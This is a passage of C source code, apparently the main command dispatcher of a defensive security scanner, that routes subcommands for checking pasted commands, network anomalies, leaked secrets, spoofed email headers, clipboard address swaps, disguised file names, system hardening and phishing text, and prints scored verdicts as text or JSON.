            return pv.score >= 60 ? 1 : 0;
        }
    }

    if (strcmp(argv[idx], "paste") == 0) {
        if (argc < idx + 2) {
            fprintf(stderr, "Usage: %s paste \"<command text>\"\n", argv[0]);
            return 2;
        }
        {
            PasteVerdict pv = hlse_check_paste(argv[idx + 1]);
            if (json_out) {
                int i;
                printf("{\"kind\":\"paste\",\"score\":%d,\"action\":\"%s\","
                       "\"signals\":%d,\"reasons\":[",
                       pv.score, hlse_action_for_score(pv.score), pv.signals);
                for (i = 0; i < pv.n_reasons; i++) {
                    char esc[512];
                    json_escape(pv.reasons[i], esc, sizeof(esc));
                    printf("%s\"%s\"", i > 0 ? "," : "", esc);
                }
                printf("]}\n");
            } else if (pv.score == 0) {
                printf("OK    (paste)\n");
            } else {
                int i;
                printf("%-7s [%d]  (paste)\n",
                       hlse_action_for_score(pv.score), pv.score);
                for (i = 0; i < pv.n_reasons; i++)
                    printf("  \xc2\xb7 %s\n", pv.reasons[i]);
            }
            return pv.score >= 60 ? 1 : 0;
        }
    }

    if (strcmp(argv[idx], "network") == 0) {
        NetworkVerdict nv = hlse_check_network();
        if (json_out) {
            int i;
            printf("{\"kind\":\"network\",\"score\":%d,\"action\":\"%s\","
                   "\"reasons\":[", nv.score, hlse_action_for_score(nv.score));
            for (i = 0; i < nv.n_reasons; i++) {
                char esc[512];
                json_escape(nv.reasons[i], esc, sizeof(esc));
                printf("%s\"%s\"", i > 0 ? "," : "", esc);
            }
            printf("]}\n");
        } else if (nv.score == 0) {
            printf("OK    (network — no anomalies detected)\n");
        } else {
            int i;
            printf("%-7s [%d]  (network)\n",
                   hlse_action_for_score(nv.score), nv.score);
            for (i = 0; i < nv.n_reasons; i++)
                printf("  \xc2\xb7 %s\n", nv.reasons[i]);
        }
        return nv.score >= 60 ? 1 : 0;
    }

    if (strcmp(argv[idx], "secret") == 0) {
        char stdin_buf[65536];
        const char *text;
        if (argc < idx + 2) {
            fprintf(stderr, "Usage: %s secret \"<text>\" | %s secret --stdin\n",
                    argv[0], argv[0]);
            return 2;
        } else if (strcmp(argv[idx + 1], "--stdin") == 0) {
            read_stdin_all(stdin_buf, sizeof(stdin_buf));
            text = stdin_buf;
        } else {
            text = argv[idx + 1];
        }
        {
            SecretVerdict sv = hlse_scan_secrets(text);
            if (json_out) {
                int i;
                printf("{\"kind\":\"secret\",\"score\":%d,\"action\":\"%s\","
                       "\"findings\":[", sv.score, hlse_action_for_score(sv.score));
                for (i = 0; i < sv.n_findings; i++) {
                    char et[64], ed[512];
                    json_escape(sv.findings[i].type, et, sizeof(et));
                    json_escape(sv.findings[i].description, ed, sizeof(ed));
                    printf("%s{\"type\":\"%s\",\"description\":\"%s\"}",
                           i > 0 ? "," : "", et, ed);
                }
                printf("]}\n");
            } else if (sv.score == 0) {
                printf("OK    (secret — no credentials found)\n");
            } else {
                int i;
                printf("%-7s [%d]  (secret scan)\n",
                       hlse_action_for_score(sv.score), sv.score);
                for (i = 0; i < sv.n_findings; i++)
                    printf("  \xc2\xb7 [%s] %s\n",
                           sv.findings[i].type, sv.findings[i].description);
            }
            return sv.score >= 60 ? 1 : 0;
        }
    }

    if (strcmp(argv[idx], "email") == 0) {
        char stdin_buf[65536];
        const char *headers;
        if (argc < idx + 2) {
            fprintf(stderr, "Usage: %s email \"<headers>\" | %s email --stdin\n",
                    argv[0], argv[0]);
            return 2;
        } else if (strcmp(argv[idx + 1], "--stdin") == 0) {
            read_stdin_all(stdin_buf, sizeof(stdin_buf));
            headers = stdin_buf;
        } else {
            headers = argv[idx + 1];
        }
        {
            EmailVerdict ev = hlse_check_email_headers(headers);
            if (json_out) {
                int i;
                printf("{\"kind\":\"email\",\"score\":%d,\"action\":\"%s\","
                       "\"reasons\":[", ev.score, hlse_action_for_score(ev.score));
                for (i = 0; i < ev.n_reasons; i++) {
                    char esc[512];
                    json_escape(ev.reasons[i], esc, sizeof(esc));
                    printf("%s\"%s\"", i > 0 ? "," : "", esc);
                }
                printf("]}\n");
            } else if (ev.score == 0) {
                printf("OK    (email — no spoofing signals)\n");
            } else {
                int i;
                printf("%-7s [%d]  (email forensics)\n",
                       hlse_action_for_score(ev.score), ev.score);
                for (i = 0; i < ev.n_reasons; i++)
                    printf("  \xc2\xb7 %s\n", ev.reasons[i]);
            }
            return ev.score >= 60 ? 1 : 0;
        }
    }

    if (strcmp(argv[idx], "clipboard") == 0) {
        if (argc < idx + 3) {
            fprintf(stderr,
                    "Usage: %s clipboard \"<copied addr>\" \"<pasted addr>\"\n",
                    argv[0]);
            return 2;
        }
        {
            CryptoSwapVerdict cv =
                hlse_check_crypto_swap(argv[idx + 1], argv[idx + 2]);
            if (json_out) {
                char eo[256], es[256], er[512];
                json_escape(cv.original, eo, sizeof(eo));
                json_escape(cv.swapped, es, sizeof(es));
                json_escape(cv.reason, er, sizeof(er));
                printf("{\"kind\":\"clipboard\",\"score\":%d,\"action\":\"%s\","
                       "\"is_swap\":%d,"
                       "\"original\":\"%s\",\"swapped\":\"%s\",\"reason\":\"%s\"}\n",
                       cv.score, hlse_action_for_score(cv.score),
                       cv.is_swap, eo, es, er);
            } else if (cv.score == 0) {
                printf("OK    (clipboard — no address swap detected)\n");
            } else {
                printf("%-7s [%d]  (clipboard)\n",
                       hlse_action_for_score(cv.score), cv.score);
                if (cv.reason[0]) printf("  \xc2\xb7 %s\n", cv.reason);
            }
            return cv.score >= 60 ? 1 : 0;
        }
    }

    if (strcmp(argv[idx], "file") == 0) {
        if (argc < idx + 2) {
            fprintf(stderr, "Usage: %s file <filepath>\n", argv[0]);
            return 2;
        }
        {
            FileVerdict fv;
            /* If the file exists on disk, do full magic-byte + filename
             * analysis. If not, still check the NAME for disguise tricks
             * (RLO, double extension, lure words) — these are dangerous
             * regardless of whether the file is present locally.        */
            if (access(argv[idx + 1], F_OK) == 0) {
                fv = hlse_check_file(argv[idx + 1]);
            } else {
                const char *base = strrchr(argv[idx + 1], '/');
                base = base ? base + 1 : argv[idx + 1];
                fv = hlse_check_filename(base);
            }
            if (json_out) {
                int i;
                char esc[512];
                json_escape(argv[idx + 1], esc, sizeof(esc));
                printf("{\"kind\":\"file\",\"path\":\"%s\",\"score\":%d,"
                       "\"action\":\"%s\",\"reasons\":[",
                       esc, fv.score, hlse_action_for_score(fv.score));
                for (i = 0; i < fv.n_reasons; i++) {
                    json_escape(fv.reasons[i], esc, sizeof(esc));
                    printf("%s\"%s\"", i > 0 ? "," : "", esc);
                }
                printf("]}\n");
            } else if (fv.score == 0) {
                printf("OK    %s\n", argv[idx + 1]);
            } else {
                int i;
                printf("%-7s [%d]  %s\n",
                       hlse_action_for_score(fv.score), fv.score,
                       argv[idx + 1]);
                for (i = 0; i < fv.n_reasons; i++)
                    printf("  \xc2\xb7 %s\n", fv.reasons[i]);
            }
            return fv.score >= 60 ? 1 : 0;
        }
    }

    if (strcmp(argv[idx], "audit") == 0) {
        AuditVerdict av = hlse_audit_all();
        int hi = hlse_audit_hardening_index(&av);
        const char *band = hi >= 90 ? "hardened"
                         : hi >= 70 ? "good"
                         : hi >= 50 ? "fair" : "weak";
        if (json_out) {
            int i;
            printf("{\"kind\":\"audit\",\"score\":%d,\"action\":\"%s\","
                   "\"hardening_index\":%d,\"hardening_band\":\"%s\","
                   "\"findings\":[",
                   av.score, hlse_action_for_score(av.score), hi, band);
            for (i = 0; i < av.n_findings; i++) {
                char esc[512];
                json_escape(av.findings[i].description, esc, sizeof(esc));
                printf("%s{\"severity\":%d,\"description\":\"%s\"}",
                       i > 0 ? "," : "",
                       av.findings[i].severity, esc);
            }
            printf("]}\n");
        } else if (av.score == 0) {
            printf("OK    (audit — no issues found)  "
                   "Hardening index: %d/100 (%s)\n", hi, band);
        } else {
            int i;
            printf("%-7s [%d]  (system audit)  Hardening index: %d/100 (%s)\n",
                   hlse_action_for_score(av.score), av.score, hi, band);
            for (i = 0; i < av.n_findings; i++) {
                const char *sev_str[] = {
                    "PASS", "INFO", "LOW", "MED", "HIGH", "CRIT"
                };
                int s = av.findings[i].severity;
                if (s < 0 || s > 5) s = 0;
                printf("  [%4s] %s\n", sev_str[s],
                       av.findings[i].description);
            }
        }
        return av.score >= 60 ? 1 : 0;
    }

    if (strcmp(argv[idx], "text") == 0) {
        if (argc < idx + 2) {
            fprintf(stderr, "Usage: %s text \"<message>\"\n", argv[0]);
            return 2;
        }
        {
            /* Use unified scan — it runs text detection AND extracts
             * embedded URLs. This catches "Click here: https://g00gle.com" */
            ScanResult sr = hlse_scan(argv[idx + 1]);
            if (json_out) {
                /* Build TextVerdict from the unified ScanResult so the JSON
                 * path honours embedded URL extraction (same as human path). */
                TextVerdict tv;
                int ti;
                memset(&tv, 0, sizeof(tv));
                tv.score = sr.score;
                tv.n_reasons = sr.n_reasons < (int)(sizeof(tv.reasons)/sizeof(tv.reasons[0]))
                               ? sr.n_reasons : (int)(sizeof(tv.reasons)/sizeof(tv.reasons[0]));
                for (ti = 0; ti < tv.n_reasons; ti++)
                    snprintf(tv.reasons[ti], sizeof(tv.reasons[0]),
                             "%s", sr.reasons[ti]);
                print_json_text(argv[idx + 1], &tv);
            } else if (sr.score == 0) {
                printf("OK    (text)\n");
            } else {
                int i;
                printf("%-7s [%d]  (text) %.60s%s\n",
                       hlse_action_for_score(sr.score),
                       sr.score, argv[idx + 1],
                       strlen(argv[idx + 1]) > 60 ? "..." : "");
                for (i = 0; i < sr.n_reasons; i++) {
                    printf("  \xc2\xb7 %s\n", sr.reasons[i]);
                }
            }
            return sr.score >= 60 ? 1 : 0;
        }
    }
    /* Default: use unified scan (auto-detects URL vs text) */
    {
        const char *input = argv[idx];

        /* Empty string → nothing to scan */
        if (!input || !input[0]) {
            fprintf(stderr, "Nothing to scan. Pass a URL or message.\n");
            return 2;
        }

        /* Use unified scan API */
        ScanResult sr = hlse_scan(input);
        if (json_out) {
            /* For JSON, delegate to the appropriate printer. For text
             * inputs use the ScanResult directly (not hlse_check_text
             * alone) so embedded URL extraction is honoured. */
            if (sr.is_url) {
                Verdict uv = check_url(input);
                print_json_url(input, &uv);
            } else {
                TextVerdict tv;
                int ti;
                memset(&tv, 0, sizeof(tv));
                tv.score = sr.score;
                tv.n_reasons = sr.n_reasons < (int)(sizeof(tv.reasons)/sizeof(tv.reasons[0]))
                               ? sr.n_reasons : (int)(sizeof(tv.reasons)/sizeof(tv.reasons[0]));
                for (ti = 0; ti < tv.n_reasons; ti++)
                    snprintf(tv.reasons[ti], sizeof(tv.reasons[0]),
                             "%s", sr.reasons[ti]);
                print_json_text(input, &tv);
            }
        } else if (sr.score == 0) {
            printf("OK    %s\n", input);
        } else {
            int i;
            printf("%-7s [%d]  %s\n",
                   hlse_action_for_score(sr.score), sr.score, input);
            for (i = 0; i < sr.n_reasons; i++) {
                printf("  · %s\n", sr.reasons[i]);
            }
        }
        return sr.score >= 60 ? 1 : 0;
    }
}
#endif /* HLSE_CORE_AS_LIB */
